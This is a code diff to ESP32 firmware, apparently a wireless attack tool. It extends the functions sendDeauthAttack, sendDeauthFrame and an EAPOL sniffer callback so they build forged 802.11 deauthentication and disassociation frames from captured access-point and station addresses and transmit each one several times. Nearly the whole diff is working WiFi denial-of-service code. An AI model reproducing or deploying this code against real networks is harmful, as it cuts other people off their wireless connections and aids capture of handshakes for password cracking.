@@ -900,23 +900,19 @@ void WiFiModules::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 	if (eapol_scan_send_deauth) {
 		if (snifferPacket->payload[0] == 0x80) {    
 		// Build packet
+		uint8_t bssid[6];
+		for (int i = 10; i < 16; i++) {
+			bssid[i-10] = snifferPacket->payload[i];
+		}
+		memcpy(&wifi.deauth_frame_packet[10], bssid, 6);
+		memcpy(&wifi.deauth_frame_packet[16], bssid, 6);
 		
-		wifi.deauth_frame_packet[10] = snifferPacket->payload[10];
-		wifi.deauth_frame_packet[11] = snifferPacket->payload[11];
-		wifi.deauth_frame_packet[12] = snifferPacket->payload[12];
-		wifi.deauth_frame_packet[13] = snifferPacket->payload[13];
-		wifi.deauth_frame_packet[14] = snifferPacket->payload[14];
-		wifi.deauth_frame_packet[15] = snifferPacket->payload[15];
-		
-		wifi.deauth_frame_packet[16] = snifferPacket->payload[10];
-		wifi.deauth_frame_packet[17] = snifferPacket->payload[11];
-		wifi.deauth_frame_packet[18] = snifferPacket->payload[12];
-		wifi.deauth_frame_packet[19] = snifferPacket->payload[13];
-		wifi.deauth_frame_packet[20] = snifferPacket->payload[14];
-		wifi.deauth_frame_packet[21] = snifferPacket->payload[15];      
+		memcpy(&wifi.disassoc_frame_packet[10], bssid, 6);     
+		memcpy(&wifi.disassoc_frame_packet[16], bssid, 6);
 		
 		// Send packet
 		esp_wifi_80211_tx(WIFI_IF_AP, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet), false);
+		esp_wifi_80211_tx(WIFI_IF_AP, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet), false);
 		delay(1);
 		}
 	}
@@ -1364,32 +1360,33 @@ void WiFiModules::sendDeauthAttack() {
 			
 			// Build packet
 			
-			deauth_frame_packet[10] = access_points->get(i).bssid[0];
-			deauth_frame_packet[11] = access_points->get(i).bssid[1];
-			deauth_frame_packet[12] = access_points->get(i).bssid[2];
-			deauth_frame_packet[13] = access_points->get(i).bssid[3];
-			deauth_frame_packet[14] = access_points->get(i).bssid[4];
-			deauth_frame_packet[15] = access_points->get(i).bssid[5];
-		
-			deauth_frame_packet[16] = access_points->get(i).bssid[0];
-			deauth_frame_packet[17] = access_points->get(i).bssid[1];
-			deauth_frame_packet[18] = access_points->get(i).bssid[2];
-			deauth_frame_packet[19] = access_points->get(i).bssid[3];
-			deauth_frame_packet[20] = access_points->get(i).bssid[4];
-			deauth_frame_packet[21] = access_points->get(i).bssid[5];      
+			memcpy(&deauth_frame_packet[10], access_points->get(i).bssid, 6);
+			memcpy(&deauth_frame_packet[16], access_points->get(i).bssid, 6);
+
+			memcpy(&disassoc_frame_packet[10], access_points->get(i).bssid, 6);
+			memcpy(&disassoc_frame_packet[16], access_points->get(i).bssid, 6);    
 		
 			// Send packet
-		  	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
-
-			packet_sent = packet_sent + 3;
-
+		
+			esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+			esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+			esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+			packet_sent = packet_sent + 6;
+		
 			if (res_1 != ESP_OK)
 				packet_sent -= 1;
 			if (res_2 != ESP_OK)
 				packet_sent -= 1;
 			if (res_3 != ESP_OK)
+				packet_sent -= 1;
+			if (res_4 != ESP_OK)
+				packet_sent -= 1;
+			if (res_5 != ESP_OK)
+				packet_sent -= 1;
+			if (res_6 != ESP_OK)
 				packet_sent -= 1;
 		}
 	}
@@ -1406,33 +1403,22 @@ void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac
 	delay(1);
 	
 	// Build AP source packet
-	deauth_frame_packet[4] = sta_mac[0];
-	deauth_frame_packet[5] = sta_mac[1];
-	deauth_frame_packet[6] = sta_mac[2];
-	deauth_frame_packet[7] = sta_mac[3];
-	deauth_frame_packet[8] = sta_mac[4];
-	deauth_frame_packet[9] = sta_mac[5];
-	
-	deauth_frame_packet[10] = bssid[0];
-	deauth_frame_packet[11] = bssid[1];
-	deauth_frame_packet[12] = bssid[2];
-	deauth_frame_packet[13] = bssid[3];
-	deauth_frame_packet[14] = bssid[4];
-	deauth_frame_packet[15] = bssid[5];
-  
-	deauth_frame_packet[16] = bssid[0];
-	deauth_frame_packet[17] = bssid[1];
-	deauth_frame_packet[18] = bssid[2];
-	deauth_frame_packet[19] = bssid[3];
-	deauth_frame_packet[20] = bssid[4];
-	deauth_frame_packet[21] = bssid[5];      
-  
+	memcpy(&deauth_frame_packet[4], sta_mac, 6);
+	memcpy(&deauth_frame_packet[10], bssid, 6);
+	memcpy(&deauth_frame_packet[16], bssid, 6);
+
+	memcpy(&disassoc_frame_packet[4], sta_mac, 6);
+	memcpy(&disassoc_frame_packet[10], bssid, 6);
+	memcpy(&disassoc_frame_packet[16], bssid, 6);
 	// Send packet
 	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 
-	packet_sent = packet_sent + 3;
+	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	packet_sent = packet_sent + 6;
 
 	if (res_1 != ESP_OK)
 		packet_sent -= 1;
@@ -1440,41 +1426,43 @@ void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac
 		packet_sent -= 1;
 	if (res_3 != ESP_OK)
 		packet_sent -= 1;
+	if (res_4 != ESP_OK)
+		packet_sent -= 1;
+	if (res_5 != ESP_OK)
+		packet_sent -= 1;
+	if (res_6 != ESP_OK)
+		packet_sent -= 1;
   
 	// Build AP dest packet
-	deauth_frame_packet[4] = bssid[0];
-	deauth_frame_packet[5] = bssid[1];
-	deauth_frame_packet[6] = bssid[2];
-	deauth_frame_packet[7] = bssid[3];
-	deauth_frame_packet[8] = bssid[4];
-	deauth_frame_packet[9] = bssid[5];
-	
-	deauth_frame_packet[10] = sta_mac[0];
-	deauth_frame_packet[11] = sta_mac[1];
-	deauth_frame_packet[12] = sta_mac[2];
-	deauth_frame_packet[13] = sta_mac[3];
-	deauth_frame_packet[14] = sta_mac[4];
-	deauth_frame_packet[15] = sta_mac[5];
-  
-	deauth_frame_packet[16] = sta_mac[0];
-	deauth_frame_packet[17] = sta_mac[1];
-	deauth_frame_packet[18] = sta_mac[2];
-	deauth_frame_packet[19] = sta_mac[3];
-	deauth_frame_packet[20] = sta_mac[4];
-	deauth_frame_packet[21] = sta_mac[5];      
+	memcpy(&deauth_frame_packet[4], bssid, 6);
+	memcpy(&deauth_frame_packet[10], sta_mac, 6);
+	memcpy(&deauth_frame_packet[16], sta_mac, 6);
+
+	memcpy(&disassoc_frame_packet[4], bssid, 6);
+	memcpy(&disassoc_frame_packet[10], sta_mac, 6);
+	memcpy(&disassoc_frame_packet[16], sta_mac, 6);     
   
 	// Send packet
 	esp_err_t res_1_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 	esp_err_t res_2_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 	esp_err_t res_3_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
 
-	packet_sent = packet_sent + 3;
+	esp_err_t res_4_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_5_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	esp_err_t res_6_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
+	packet_sent = packet_sent + 6;
 
 	if (res_1_1 != ESP_OK)
 		packet_sent -= 1;
 	if (res_2_1 != ESP_OK)
 		packet_sent -= 1;
 	if (res_3_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_4_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_5_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_6_1 != ESP_OK)
 		packet_sent -= 1;
   }
 
